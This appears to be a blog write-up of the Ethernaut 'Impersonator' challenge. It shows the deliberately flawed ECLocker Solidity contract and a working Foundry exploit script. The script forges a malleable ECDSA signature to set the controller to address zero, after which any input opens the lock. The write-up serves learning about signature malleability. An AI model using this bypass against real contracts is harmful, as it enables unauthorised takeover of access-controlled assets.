---
layout: post
title: "[Ethernaut] 32.Impersonator"
tags: blockchain ethernaut foundry precompiled_contract ecdsa 
---

# Analysis

---

The goal is “compromise the system in a way that anyone can open the door”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "openzeppelin-contracts-08/access/Ownable.sol";

// SlockDotIt ECLocker factory
contract Impersonator is Ownable {
    uint256 public lockCounter;
    ECLocker[] public lockers;

    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);

    constructor(uint256 _lockCounter) {
        lockCounter = _lockCounter;
    }

    function deployNewLock(bytes memory signature) public onlyOwner {
        // Deploy a new lock
        ECLocker newLock = new ECLocker(++lockCounter, signature);
        lockers.push(newLock);
        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
    }
}

contract ECLocker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address public controller;
    mapping(bytes32 => bool) public usedSignatures;

    event LockInitializated(address indexed initialController, uint256 timestamp);
    event Open(address indexed opener, uint256 timestamp);
    event ControllerChanged(address indexed newController, uint256 timestamp);

    error InvalidController();
    error SignatureAlreadyUsed();

    /// @notice Initializes the contract the lock
    /// @param _lockId uinique lock id set by SlockDotIt's factory
    /// @param _signature the signature of the initial controller
    constructor(uint256 _lockId, bytes memory _signature) {
        // Set lockId
        lockId = _lockId;

        // Compute msgHash
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, _lockId) // 32 bytes
            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
        }
        msgHash = _msgHash;

        // Recover the initial controller from the signature
        address initialController = address(1);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32 bytes
            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
            pop(
                staticcall(
                    gas(), // Amount of gas left for the transaction.
                    initialController, // Address of `ecrecover`.
                    ptr, // Start of input.
                    0x80, // Size of input.
                    0x00, // Start of output.
                    0x20 // Size of output.
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

        // Invalidate signature
        usedSignatures[keccak256(_signature)] = true;

        // Set the controller
        controller = initialController;

        // emit LockInitializated
        emit LockInitializated(initialController, block.timestamp);
    }

    /// @notice Opens the lock
    /// @dev Emits Open event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    function open(uint8 v, bytes32 r, bytes32 s) external {
        address add = _isValidSignature(v, r, s);
        emit Open(add, block.timestamp);
    }

    /// @notice Changes the controller of the lock
    /// @dev Updates the controller storage variable
    /// @dev Emits ControllerChanged event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    /// @param newController the new controller address
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }

    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        require (_address == controller, InvalidController());

        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());

        usedSignatures[signatureHash] = true;

        return _address;
    }
}
```

# Exploit

---

According to the documentation, the `ecrecover` function is described as follows:

<aside>
💡

**`ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)`**recover the address associated with the public key from elliptic curve signature or return zero on error. The function parameters correspond to ECDSA values of the signature:
• `r` = first 32 bytes of signature
• `s` = second 32 bytes of signature
• `v` = final 1 byte of signature

**Warning**
If you use `ecrecover`, be aware that a valid signature can be turned into a different valid signature without requiring knowledge of the corresponding private key. In the Homestead hard fork, this issue was fixed for _transaction_ signatures (see [EIP-2](https://eips.ethereum.org/EIPS/eip-2#specification)), but the ecrecover function remained unchanged.

This is usually not a problem unless you require signatures to be unique or use them to identify items. OpenZeppelin has an [ECDSA helper library](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA) that you can use as a wrapper for `ecrecover` without this issue.

</aside>

The `ecrecover` function returns the zero address (`0`) when an error occurs.
A valid ECDSA signature can be transformed into a different, yet still valid, signature.

Utilize `changeController()` to set the `controller` variable to `0` (address zero).
Once the `controller` is set to `0`, the authentication check involving `ecrecover` will pass regardless of the input parameters. This is because any invalid input causing `ecrecover` to fail will return `0`, which matches the compromised `controller` state.
To successfully invoke `changeController()` and set the controller to `0`, the attacker can exploit the signature malleability property to generate the necessary valid signature.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/Impersonator.sol";
import "forge-std/Script.sol";

contract ImpersonatorSol is Script {
    Impersonator public ips_ = Impersonator(0x375130383aa5423b08b77d3C9902Dc3f5c4dCE34);
    ECLocker public ecl_ = ECLocker(0x7b0F032BbaDE6732115aDF82Fd497402F684abe4);
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function run() external {
        vm.startBroadcast();

        bytes32 v;
        bytes32 r;
        bytes32 s;
        bytes memory sig = hex"1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B";
        assembly {
            r := mload(add(sig, 0x20))
            s := mload(add(sig, 0x40))
            v := mload(add(sig, 0x60))
        }

        uint8 _v = uint256(v) == 27 ? 28 : 27;
        bytes32 _r = r;
        bytes32 _s = bytes32(N - uint256(s));
        ecl_.changeController(_v, _r, _s, address(0));
        ecl_.open(uint8(0), bytes32(0), bytes32(0));

        vm.stopBroadcast();
    }
}
```

The original signature was retrieved from transaction data on Etherscan.

Exploiting the malleability of ECDSA, a new valid signature can be forged without the private key. This is achieved by:
1. Toggling the recovery identifier `v` (e.g., from 27 to 28).
2. Calculating the complementary `s` value using the curve order: $s' = secp256k1n - s$.

The resulting signature resolves to the same signer address, effectively allowing a one-time bypass of the `_isValidSignature` verification logic.